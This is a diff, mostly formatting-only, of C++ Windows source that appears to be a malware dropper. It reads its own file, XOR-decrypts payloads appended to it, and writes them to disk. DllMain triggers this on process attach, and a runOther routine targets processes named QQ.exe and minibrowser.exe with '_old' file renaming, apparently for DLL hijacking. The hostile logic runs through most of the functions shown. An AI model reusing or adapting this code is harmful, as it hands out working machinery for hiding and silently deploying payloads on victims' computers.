@@ -41,7 +41,7 @@ unsigned long gHinstance = 0;
 //rundll32 url.dll, FileProtocolHandler http ://www.baidu.com
 
 
-void CryptData(unsigned char * pdata, int size, unsigned char * pkey, int keylen) {
+void CryptData(unsigned char* pdata, int size, unsigned char* pkey, int keylen) {
 
 	for (int i = 0, j = 0; i < size;)
 	{
@@ -58,7 +58,7 @@ void CryptData(unsigned char * pdata, int size, unsigned char * pkey, int keylen
 
 
 
-int GetUserAndComputerName(char * szUsername, char * szComputerName)
+int GetUserAndComputerName(char* szUsername, char* szComputerName)
 {
 	DWORD dwSize = MAX_PATH;
 	int iRet = GetUserNameA(szUsername, &dwSize);
@@ -79,8 +79,8 @@ int GetUserAndComputerName(char * szUsername, char * szComputerName)
 
 int GetWindowsVersion()
 {
-	WKSTA_INFO_100 *wkstaInfo = NULL;
-	NET_API_STATUS netStatus = NetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkstaInfo);
+	WKSTA_INFO_100* wkstaInfo = NULL;
+	NET_API_STATUS netStatus = NetWkstaGetInfo(NULL, 100, (LPBYTE*)&wkstaInfo);
 	if (netStatus == NERR_Success)
 	{
 		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
@@ -127,8 +127,8 @@ int GetWindowsVersion()
 	return FALSE;
 }
 
-int fileWriter(const char * fn, char * lpbuf, int filesize,int append) {
-	FILE * fp = 0;
+int fileWriter(const char* fn, char* lpbuf, int filesize, int append) {
+	FILE* fp = 0;
 	if (append)
 	{
 		fp = fopen(fn, "ab+");
@@ -136,7 +136,7 @@ int fileWriter(const char * fn, char * lpbuf, int filesize,int append) {
 	else {
 		fp = fopen(fn, "wb");
 	}
-	
+
 	if (fp <= 0) {
 		return FALSE;
 	}
@@ -149,8 +149,8 @@ int fileWriter(const char * fn, char * lpbuf, int filesize,int append) {
 
 
 
-int fileReader(char * fn,char ** lpbuf,int * filesize) {
-	FILE * fp = fopen(fn, "rb");
+int fileReader(char* fn, char** lpbuf, int* filesize) {
+	FILE* fp = fopen(fn, "rb");
 	if (fp <= 0) {
 		return FALSE;
 	}
@@ -158,7 +158,7 @@ int fileReader(char * fn,char ** lpbuf,int * filesize) {
 	fseek(fp, 0, FILE_END);
 	*filesize = ftell(fp);
 	fseek(fp, 0, FILE_BEGIN);
-	if (*filesize <=0)
+	if (*filesize <= 0)
 	{
 		return FALSE;
 	}
@@ -207,7 +207,7 @@ int release(unsigned long hinst) {
 	if (iRet == FALSE)
 	{
 		iRet = GetLastError();
-		wsprintfA(szout, "MakeSureDirectoryPathExists file:%s error code:%u\r\n", szDstPath,iRet);
+		wsprintfA(szout, "MakeSureDirectoryPathExists file:%s error code:%u\r\n", szDstPath, iRet);
 		fileWriter(LOG_FILENAME, szout, lstrlenA(szout), TRUE);
 		return FALSE;
 	}
@@ -223,7 +223,7 @@ int release(unsigned long hinst) {
 #endif
 
 	int filesize = 0;
-	char * lpbuf = 0;
+	char* lpbuf = 0;
 	iRet = fileReader(szfn, &lpbuf, &filesize);
 	if (iRet == FALSE)
 	{
@@ -233,7 +233,7 @@ int release(unsigned long hinst) {
 	}
 
 	int offset = filesize - CRYPT_KEY_SIZE;
-	unsigned char * key = (unsigned char *)lpbuf + offset;
+	unsigned char* key = (unsigned char*)lpbuf + offset;
 
 	offset -= sizeof(int);
 	int outfnlen = *(int*)(lpbuf + offset);
@@ -251,7 +251,7 @@ int release(unsigned long hinst) {
 
 	string outfpath = string(szDstPath) + string(outfn);
 	CryptData((unsigned char*)lpbuf + offset, outflen, key, CRYPT_KEY_SIZE);
-	iRet = fileWriter(outfpath.c_str(), lpbuf + offset, outflen,FALSE);
+	iRet = fileWriter(outfpath.c_str(), lpbuf + offset, outflen, FALSE);
 
 
 	offset -= sizeof(int);
@@ -270,7 +270,7 @@ int release(unsigned long hinst) {
 
 	string outfpath2 = string(szDstPath) + string(outfn2);
 	CryptData((unsigned char*)lpbuf + offset, outflen2, key, CRYPT_KEY_SIZE);
-	iRet = fileWriter(outfpath2.c_str(), lpbuf + offset, outflen2,FALSE);
+	iRet = fileWriter(outfpath2.c_str(), lpbuf + offset, outflen2, FALSE);
 
 	offset -= 64;
 	CryptData((unsigned char*)lpbuf + offset, 64, key, CRYPT_KEY_SIZE);
@@ -325,13 +325,13 @@ int release(unsigned long hinst) {
 
 	//fileWriter(LOG_FILENAME, "work complete\r\n", lstrlenA("work complete\r\n"), TRUE);
 
-	delete lpbuf;
+	delete[]lpbuf;
 	return iRet;
 }
 
 
 #ifdef RUN_OTHER
-int runOther( ) {
+int runOther() {
 	int ret = 0;
 	char szcurfn[MAX_PATH] = { 0 };
 	ret = GetModuleFileNameA(0, szcurfn, MAX_PATH);
@@ -352,12 +352,14 @@ int runOther( ) {
 		{
 			newfn = newfn.replace(pos, newddpath.length(), oldddpath);
 		}
-	}else if (strstr(szcurfn,"QQ.exe"))
+	}
+	else if (strstr(szcurfn, "QQ.exe"))
 	{
 		newfn = string(szcurfn) + "_old.dll";
 		return 0;
 
-	}else if (strstr(szcurfn,"minibrowser.exe"))
+	}
+	else if (strstr(szcurfn, "minibrowser.exe"))
 	{
 		newfn = string(szcurfn) + "_old.exe";
 	}
@@ -374,7 +376,7 @@ int runOther( ) {
 //typedef HINSTANCE HMODULE;      /* HMODULEs can be used in place of HINSTANCEs */
 #ifdef _WINDLL
 extern "C" __declspec(dllexport) int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {
-	
+
 	if (fdwReason == DLL_PROCESS_ATTACH)
 	{
 		gHinstance = (unsigned long)hInstance;
@@ -388,7 +390,7 @@ extern "C" __declspec(dllexport) int __stdcall DllMain(_In_ HINSTANCE hInstance,
 	return TRUE;
 }
 #else
-int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
+int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
 {
 	gHinstance = (unsigned long)hInstance;
 	int ret = release(gHinstance);
